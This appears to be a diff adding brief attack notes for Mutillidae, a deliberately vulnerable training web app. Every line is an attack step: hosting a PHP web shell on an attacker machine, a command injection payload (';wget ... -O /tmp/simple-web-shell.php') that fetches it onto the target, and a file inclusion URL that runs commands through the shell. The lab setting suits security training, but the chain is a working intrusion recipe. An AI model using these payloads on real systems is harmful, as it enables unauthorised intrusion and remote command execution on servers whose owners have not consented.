@@ -1,0 +1,5 @@
+Serve web shell from attacker host: python -m SimpleHTTPServer 8000
+
+Use command injection to upload web shell to vulnerable server: ;wget http://127.0.0.1:8000/simple-web-shell.php -O /tmp/simple-web-shell.php 2>&1
+
+URL to activate web shell: http://mutillidae.local/index.php?page=/tmp/simple-web-shell.php&cmd=ls
